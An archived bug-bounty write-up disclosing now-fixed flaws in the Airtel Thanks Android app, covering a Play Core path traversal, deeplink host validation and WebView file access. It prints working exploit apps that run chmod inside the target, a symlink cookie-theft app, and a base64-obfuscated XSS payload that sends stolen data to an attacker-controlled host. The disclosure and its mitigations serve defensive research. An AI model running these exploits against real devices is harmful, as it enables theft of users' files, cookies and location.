---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-11-27_multiple-vulnerabilities-found-in-airtel-android-application.md
original_filename: 2022-11-27_multiple-vulnerabilities-found-in-airtel-android-application.md
title: Multiple Vulnerabilities found in Airtel Android Application
category: documents
detected_topics:
- supply-chain
- api-security
- mobile-security
- xss
- sqli
- command-injection
tags:
- imported
- documents
- supply-chain
- api-security
- mobile-security
- xss
- sqli
- command-injection
language: en
raw_sha256: f32f20a4b01b168a04a07df6315629faec4b4ccde063de1f33c9b79884301951
text_sha256: 8caa0024e98e263154fa0cedfa8de2cf652f6f2c626f840443f68f2460f933ae
ingested_at: '2026-06-28T07:32:16Z'
sensitivity: unknown
redactions_applied: false
---

# Multiple Vulnerabilities found in Airtel Android Application

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-11-27_multiple-vulnerabilities-found-in-airtel-android-application.md
- Source Type: markdown
- Detected Topics: supply-chain, api-security, mobile-security, xss, sqli, command-injection
- Ingested At: 2026-06-28T07:32:16Z
- Redactions Applied: False
- Raw SHA256: `f32f20a4b01b168a04a07df6315629faec4b4ccde063de1f33c9b79884301951`
- Text SHA256: `8caa0024e98e263154fa0cedfa8de2cf652f6f2c626f840443f68f2460f933ae`


## Content

---
title: "Multiple Vulnerabilities found in Airtel Android Application"
page_title: "Multiple Vulnerabilities found in Airtel Android Application | Gaurang Bhatnagar"
url: "https://offsec.space/posts/airtel-vulnerabilities/"
final_url: "https://offsec.space/posts/airtel-vulnerabilities/"
authors: ["Gaurang Bhatnagar (@hax0rgb)"]
programs: ["Airtel", "Google"]
bugs: ["Arbitrary Code Execution", "URL validation bypass", "Symlink attack", "XSS", "Android", "Webview"]
bounty: "4,000"
publication_date: "2022-11-27"
added_date: "2022-11-30"
source: "pentester.land/writeups.json"
original_index: 1848
---

[Home](https://offsec.space/) » [Posts](https://offsec.space/posts/)

# Multiple Vulnerabilities found in Airtel Android Application

November 27, 2022 · 8 min · 1542 words · Gaurang Bhatnagar | [Suggest Changes](https://github.com/%3cpath_to_repo%3e/content/posts/airtel-vulnerabilities.md)

![](https://offsec.space/img/airtel/cover.svg)

Table of Contents

  * Arbitrary Code Execution
  * Exploit
  * Lack of Host Validation
  * Loading Arbitrary URL’s in WebView
  * Stealing Geolocation Data
  * Theft of cookies via Symlink attack
  * Mitigating these vulnerabilities
  * Disclosure Timelines

Before presenting my talk at SourceZeroCon on [Deep Dive into Android Static Analysis](https://speakerdeck.com/0xgaurang/deep-dive-into-android-static-analysis-and-exploitation), I spent a lot of time understanding WebViews and looked for vulnerable implementations in popular Android applications (mainly applications with 100M+ downloads). One such application was [Airtel Thanks](https://play.google.com/store/apps/details?id=com.myairtelapp&hl=en_IN&gl=US) where I identified a number of vulnerabilities. This blog post discusses about the high impact vulnerabilities that were reported.

Airtel has fixed these vulnerabilities and it is recommended to update [Airtel Thanks](https://play.google.com/store/apps/details?id=com.myairtelapp&hl=en_IN&gl=US) application to the latest version from Play Store. These vulnerabilities were rewarded $4000 by Google as part of the [GPSRP](https://bughunters.google.com/about/rules/5604090422493184/google-play-security-reward-program-rules).

The application could be exploited by remote users and third-party applications on the Android device.

`Remote attackers` could exploit vulnerabilities in the Airtel application to:

  * Mount phishing attacks
  * Steal the user’s location
  * Retrieve sensitive header values from API endpoints
  * Steal local database files with the help of a third-party Android application.

`Third-party applications` on the Android device could exploit vulnerabilities in the application to execute arbitrary code in the Airtel application. As a result, this would allow:

  * Steal all user files (app’s internal storage) containing sensitive information and send it to remote domain
  * Access contact information
  * Send SMS messages
  * Use Airtel app’s location access to track the device and user
  * Access user personal information (phone number, email address etc.)
  * Inject code to grab credentials

## Arbitrary Code Execution#

The Airtel android application used a vulnerable version of the [Google Play Core library](https://developer.android.com/reference/com/google/android/play/core/release-notes#1-7-2) known to contain arbitrary code execution vulnerability. Airtel has fixed this vulnerability by updating the `Play Core Library` to the latest version. The vulnerability was fixed in Airtel Thanks version `4.31.1.6`.

Here’s the vulnerable code snippet taken from the application where the library copies content from the URI from `split_file_intents` into the `unverified-splits directory` under the name `split_id`, which is subject to path-traversal due to the absence of validation.
  
  
  for (Intent next : list) {
  String stringExtra = next.getStringExtra("split_id");
  AssetFileDescriptor openAssetFileDescriptor = this.f21978a.getContentResolver().openAssetFileDescriptor(next.getData(), "r");
  C7869d dVar = this.f21979b;
  if (dVar != null) {
  File file = new File(dVar.mo29396g(), "unverified-splits");
  C7869d.m17190c(file);
  File file2 = new File(file, C7869d.m17192i(stringExtra));
  if (((file2.exists() && file2.length() != openAssetFileDescriptor.getLength()) || !file2.exists()) && !this.f21979b.mo29393b(stringExtra).exists()) {
  BufferedInputStream bufferedInputStream = new BufferedInputStream(openAssetFileDescriptor.createInputStream());
  try {
  fileOutputStream = new FileOutputStream(file2);
  byte[] bArr = new byte[4096];
  while (true) {
  int read = bufferedInputStream.read(bArr);
  if (read <= 0) {
  break;
  }
  fileOutputStream.write(bArr, 0, read);
  

### Exploit#

To exploit this vulnerability a malicious Android application was created. The following code executes the command `chmod -R 777 /data/user/0/com.myairtelapp` in the context of the vulnerable app.

`Mainactivity.java`:
  
  
  public static final String APP = "com.myairtelapp";
  
  @Override
  protected void onCreate(Bundle savedInstanceState) {
  super.onCreate(savedInstanceState);
  Intent launchIntent = getPackageManager().getLaunchIntentForPackage(APP);
  startActivity(launchIntent);
  
  new Handler().postDelayed(() -> {
  Intent split = new Intent();
  split.setData(Uri.parse("file://" + getApplicationInfo().sourceDir));
  split.putExtra("split_id", "../verified-splits/config.test");
  
  Bundle bundle = new Bundle();
  bundle.putInt("status", 3);
  bundle.putParcelableArrayList("split_file_intents", new ArrayList<Parcelable>(Arrays.asList(split)));
  
  Intent intent = new Intent("com.google.android.play.core.splitinstall.receiver.SplitInstallUpdateIntentService");
  intent.setPackage(APP);
  intent.putExtra("session_state", bundle);
  sendBroadcast(intent);
  }, 3000);
  
  new Handler().postDelayed(() -> {
  startActivity(launchIntent.putExtra("x", new ParcelableObject()));
  }, 5000);
  }
  }
  

Code for the class that executes the command under the attacker’s control on deserialization:

`PareceableObject.java`:
  
  
  public class ParcelableObject implements Parcelable {
  protected ParcelableObject(Parcel in) {
  }
  
  public static final Creator<ParcelableObject> CREATOR = new Creator<ParcelableObject>() {
  @Override
  public ParcelableObject createFromParcel(Parcel in) {
  exploit();
  return null;
  }
  
  @Override
  public ParcelableObject[] newArray(int size) {
  exploit();
  return null;
  }
  
  private void exploit() {
  try {
  Runtime.getRuntime().exec("chmod -R 777 /data/user/0/" + MainActivity.APP).waitFor();
  } catch (Throwable th) {
  throw new RuntimeException(th);
  }
  }
  };
  
  public ParcelableObject() {
  }
  
  @Override
  public int describeContents() {
  return 0;
  }
  
  @Override
  public void writeToParcel(Parcel parcel, int i) {
  }
  
  
  }
  

The exploit app executes the command `chmod -R 777 /data/user/0/com.myairtelapp` in the context of the Airtel application, which makes the Airtel app local directory (`/data/user/0/com.myairtelapp`) to world readable and writeable. Thus, allowing any application on the non-rooted device to access the user’s sensitive files located in the Airtel application directory.

![chmod](/img/airtel/chmod.png)

If a malicious application exploits this vulnerability, it can gain code execution inside the application and have the same access as the vulnerable application.

## Lack of Host Validation#

A deeplink feature in the Airtel application failed to validate the requested endpoint. A specially crafted request from a website or a third-party app on the device could trigger the deeplink and redirect the user to a specific destination.

### Loading Arbitrary URL’s in WebView#

The android app registers the scheme `myairtel` and host `app` as shown in AndroidManifest.xml file.

`AndroidManifest.xml`:
  
  
  <activity android:theme="@style/AppThemeMain" android:name="com.myairtelapp.activity.SplashScreenActivity" android:launchMode="singleTask" android:screenOrientation="portrait">
  <intent-filter>
  <action android:name="android.intent.action.MAIN"/>
  <category android:name="android.intent.category.LAUNCHER"/>
  </intent-filter>
  <intent-filter>
  <action android:name="android.intent.action.VIEW"/>
  <category android:name="android.intent.category.DEFAULT"/>
  <category android:name="android.intent.category.BROWSABLE"/>
  <data android:scheme="http" android:host="www.airtel.in"/>
  <data android:scheme="http" android:host="airtel.in"/>
  <data android:scheme="http" android:host="www.airtel.in"/>
  <data android:scheme="https" android:host="airtel.in"/>
  <data android:scheme="https" android:host="www.airtel.in"/>
  <data android:scheme="https" android:host="pay1.airtel.in"/>
  <data android:scheme="https" android:host="www.pay1.airtel.in"/>
  <data android:scheme="myairtel" android:host="app"/>
  </intent-filter>
  </activity>
  

Several classes parsed the deeplink without adding any host validation check. Shown below is an example taken from one of the class.
  
  
  @butterknife.OnClick
  public void onClickQuickAction(android.view.View view) {
  if (this.f48144g != null) {
  switch (view.getId()) {
  case 2131366197:
  <..snipped..>
  case 2131366198:
  com.myairtelapp.navigator.AppNavigator.navigate(this.f48144g, android.net.Uri.parse("myairtel://webview?au=https%3A%2F%2Fwww.airtel.com&type=merchant"));
  p003b.p004a.b0.p047k.EnumC1357b bVar2 = p003b.p004a.b0.p047k.EnumC1357b.TopRight_AvlBalance_Hotels;
  p003b.p725v.p734b.p764d.p796k.p816t.C10757j3.Y1(true, "TopRight_AvlBalance_Hotels", null);
  break;
  <..snipped..>
  

Due to insufficient URL validation, it is possible to load any arbitrary URL in the webview.

The deeplink can be triggered by embedding it into the HTML form as shown below:
  
  
  <html>
  <head><title>Deeplink</title></head>
  <body style="text-align: center;">
  <h1><a href="myairtel://app/webview?au=https://www.example.com">Click here</a></h1>
  </body>
  </html>
  

As shown in the screenshot below, the URL <https://www.example.com> is loaded in the target application’s webview.

![example](/img/airtel/example.png)

Therefore, a remote attacker or malicious third-party websites can embed this deeplink in webpages to perform phishing attack and can also use it to steal sensitive header values as shown below:

![headers](/img/airtel/headers.png)

### Stealing Geolocation Data#

Due to the WebView settings `JavaScriptEnabled` and `setGeolocationEnabled` set to `True`, it was possible to execute Javascript and steal user’s geolocation data. The following payload was used:
  
  
  function geoFindMe() {
  
  const status = document.querySelector('#status');
  const mapLink = document.querySelector('#map-link');
  
  mapLink.href = '';
  mapLink.textContent = '';
  
  function success(position) {
  const latitude  = position.coords.latitude;
  const longitude = position.coords.longitude;
  
  status.textContent = '';
  mapLink.href = `https://www.openstreetmap.org/#map=18/${latitude}/${longitude}`;
  mapLink.textContent = `Latitude: ${latitude} °, Longitude: ${longitude} °`;
  }
  
  function error() {
  status.textContent = 'Unable to retrieve your location';
  }
  
  if (!navigator.geolocation) {
  status.textContent = 'Geolocation is not supported by your browser';
  } else {
  status.textContent = 'Locating…';
  navigator.geolocation.getCurrentPosition(success, error);
  }
  
  }
  
  document.querySelector('#find-me').addEventListener('click', geoFindMe);
  

![geo](/img/airtel/geo.png)

### Theft of cookies via Symlink attack#

_The following attack is only exploitable on Android devices running version Marshmallow or before._

Here’s the exploit in action:

![video](/img/airtel/airtel-theft.mp4)

The WebView had `setJavaScriptEnabled(true)` and `setAllowFileAccess(true`) flags set, which could allow an attacker to execute JavaScript and load protected files from the application sandbox.

The main idea is to set a cookie with an XSS payload that sends current document contents to an external server. A symlink with a .html extension to the database file is created, and WebView is forced to open the symlink. SQLite database file will be parsed as an HTML document, XSS will trigger and leak all the data from the database to the attacker-controlled domain. As shown in the following screenshot, it was possible to exfiltrate the data from the SQLite database to the attacker-controlled domain (Burp Collaborator in this case).

A malicious android application on the user’s device can contain the following code:

`Mainactivity.java`:
  
  
  public class MainActivity extends AppCompatActivity {
  
  private static final String APP = "com.myairtelapp";
  
  protected void onCreate(Bundle savedInstanceState) {
  super.onCreate(savedInstanceState);
  
  launch("http://[IP]:[Port]/set_cookies.html");
  new Handler().postDelayed(() -> launch("file://" + symlink()), 45000);
  }
  
  private void launch(String url) {
  Intent intent = new Intent();
  intent.setData(Uri.parse("myairtel://app/webview?au="+url));
  startActivity(intent);
  }
  
  private String symlink() {
  try {
  String root = getApplicationInfo().dataDir;
  String symlink = root + "/symlink.html";
  String cookies = getPackageManager().getApplicationInfo(APP, 0).dataDir + "/app_webview/Cookies";
  
  Runtime.getRuntime().exec("ln -s " + cookies + " " + symlink).waitFor();
  Runtime.getRuntime().exec("chmod -R 777 " + root).waitFor();
  
  return symlink;
  }
  catch (Throwable th) {
  throw new RuntimeException(th);
  }
  }
  
  }
  

The above code creates a symlink and then calls set_cookies.html file. The set_cookies.html file contains reference to the attacker server (burp collaborator in this case).
  
  
  <html>
  <body>
  <h1>Symlink in work...Please Wait!!</h1>
  <script>
  document.cookie = "x = '<img src=\"x\" onerror=\"eval(atob('dmFyIGltZyA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImltZyIpOwppbWcuc3JjID0gImh0dHA6Ly9mYnV6Nmlhd3B6cjU3bTgyNTN4NjJvY2N6MzV0dGkuYnVycGNvbGxhYm9yYXRvci5uZXQvc3RlYWwuanBnP3B3bj0iICsgZW5jb2RlVVJJQ29tcG9uZW50KGRvY3VtZW50LmdldEVsZW1lbnRzQnlUYWdOYW1lKCJodG1sIilbMF0uaW5uZXJIVE1MKTs='))\">'"
  </script>
  </body>
  </html>
  

The HTML file executes javascript and sends sqlite database file (cookies.db) using XmlHTTPRequest to our burp collaborator domain.

The following screenshot shows the SQLiteDB file from Airtel app sent to the remote domain.

![symlink](/img/airtel/symlink.png)

## Mitigating these vulnerabilities#

  * It is important to make sure that all the libraries consumed by the mobile application must be updated regularly. Google released the [CVE-2020-8913](https://developer.android.com/reference/com/google/android/play/core/release-notes#1-7-2) advisory in March 2020 notifying customers about a code execution bug.

  * Several mobile applications do not implement a proper host validation, thus allowing attackers or malware to load arbitrary content in WebView. It is important to restrict unwanted websites to be loaded within the mobile application. If that is a requirement, make sure to restrict WebView properties that allows executing JavaScript, fetching local files via `file://` or `content://` scheme and fetching geolocation coordinates.

## Disclosure Timelines#

  * Regarding the code execution bug, Airtel was contacted in January 2021 via email. After several unsuccessful attempts in receiving any response via mail, a concerned authority from their security team was informed on social media channel that their Airtel Thanks app is consuming a vulnerable library. Airtel responded via email on 3rd September 2021 that they are investigating this issue. The issue was fixed by Airtel on 7th September 2021.

  * Host validation issue was reported to Airtel in January 2021 via email. Airtel confirmed this issue in March 2021. This has been fixed and the vulnerability can no longer be reproduced in Airtel Thanks version `4.54.1` released in September 2022.

  * [Android](https://offsec.space/tags/android/)
  * [bug bounty](https://offsec.space/tags/bug-bounty/)

[« Prev  
Beyond Base64: The Vulnerability Leaving Millions of Calls Exposed](https://offsec.space/posts/beyond-base64/) [Next »  
Introducing InsecureShop](https://offsec.space/posts/introducing-insecureshop/)

[](https://twitter.com/intent/tweet/?text=Multiple%20Vulnerabilities%20found%20in%20Airtel%20Android%20Application&url=https%3a%2f%2foffsec.space%2fposts%2fairtel-vulnerabilities%2f&hashtags=Android%2cbugbounty)[](https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2foffsec.space%2fposts%2fairtel-vulnerabilities%2f&title=Multiple%20Vulnerabilities%20found%20in%20Airtel%20Android%20Application&summary=Multiple%20Vulnerabilities%20found%20in%20Airtel%20Android%20Application&source=https%3a%2f%2foffsec.space%2fposts%2fairtel-vulnerabilities%2f)[](https://reddit.com/submit?url=https%3a%2f%2foffsec.space%2fposts%2fairtel-vulnerabilities%2f&title=Multiple%20Vulnerabilities%20found%20in%20Airtel%20Android%20Application)[](https://facebook.com/sharer/sharer.php?u=https%3a%2f%2foffsec.space%2fposts%2fairtel-vulnerabilities%2f)[](https://api.whatsapp.com/send?text=Multiple%20Vulnerabilities%20found%20in%20Airtel%20Android%20Application%20-%20https%3a%2f%2foffsec.space%2fposts%2fairtel-vulnerabilities%2f)[](https://telegram.me/share/url?text=Multiple%20Vulnerabilities%20found%20in%20Airtel%20Android%20Application&url=https%3a%2f%2foffsec.space%2fposts%2fairtel-vulnerabilities%2f)
